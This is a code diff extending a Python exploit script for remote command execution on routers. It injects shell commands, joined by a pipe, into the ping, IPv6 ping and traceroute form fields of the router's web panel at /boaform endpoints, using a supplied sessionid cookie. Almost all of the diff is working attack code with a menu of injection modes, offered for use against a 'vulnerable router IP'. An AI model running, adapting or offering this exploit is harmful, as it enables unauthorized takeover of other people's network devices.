@@ -8,28 +8,74 @@ import threading
 def main():
     start()
 
-def execute_command(address, token, commands):
+# TODO implement more cases for responses
+def handle_response(response): 
+    if not isinstance(response, requests.Response):
+        print("Wrong parameter")
+        return
+
+    content = response.content
+
+    if "/admin/login.asp" in str(content):
+        print("Invalid sessionid.")
+        return
+
+    print(f"Got a response: {content}")
+
+def execute_command(address, token, commands, mode):
     headers = {'Cookie': f'sessionid={token}'}
 
-    for command in commands:
-        data = f'pingAddr=::+|+{command.replace(' ', '+')}&wanif=65535'
-        response = requests.post(f'http://{address}/boaform/formPing6', data=data, headers=headers)
-        print(response.content)
+    match mode:
+        case 1:
+            for command in commands:
+                handle_response(requests.post(
+                    f'http://{address}/boaform/formPing', 
+                    data=f'pingAddr=::+|+{command.replace(' ', '+')}&wanif=65535', 
+                    headers=headers))
+        case 2:
+            for command in commands:
+                handle_response(requests.post(
+                    f'http://{address}/boaform/formPing6', 
+                    data=f'pingAddr=127.0.0.1+|+{command.replace(' ', '+')}&wanif=65535', 
+                    headers=headers))
+        case 3:
+            for command in commands:
+                handle_response(requests.post(
+                    f'http://{address}/boaform/formTracert', 
+                    data=f'proto=0&traceAddr=1.1.1.1+|+{command.replace(' ', '+')}&trys=3&timeout=5&datasize=56&dscp=0&maxhop=30&wanif=65535', 
+                    headers=headers))
+        case _:
+            print("Unsupported mode: " + mode)
 
 def start():
-    supplied_address = input("Please supply your vulnerable router IP address: ")
+    print("This program has 3 different modes")
+    print("1) IPv4 Ping Mode")
+    print("2) IPv6 Ping Mode")
+    print("3) Traceroute Mode")
+    mode = input("Please choose the mode: ")
 
-    supplied_token = input("Please supply the sessionid for the web panel: ")
+    while mode not in [1, 2, 3, "1", "2", "3"]:
+        mode = input("Please choose the mode: ")
 
-    supplied_command = input("Supply commands to execute, when done type rce#fi: ")
+    mode = int(mode)
 
-    supplied_commands = []
+    address = input("Please supply your vulnerable router IP address: ")
 
-    while supplied_command != 'rce#fi':
-        supplied_commands.append(supplied_command)
-        supplied_command = input("Supply commands to execute, when done type rce#fi: ")
+    token = input("Please supply the sessionid for the web panel: ")
 
-    thread = threading.Thread(target=execute_command, args=(supplied_address, supplied_token, supplied_commands))
+    command = input("Supply commands to execute, when done type rce#fi: ")
+
+    commands = []
+
+    while command != 'rce#fi':
+        commands.append(command)
+        command = input("Supply commands to execute, when done type rce#fi: ")
+
+    if len(commands) == 0:
+        print("Commands are emtpy!")
+        return
+
+    thread = threading.Thread(target=execute_command, args=(address, token, commands, mode))
     thread.start()
 
 if __name__ == "__main__":
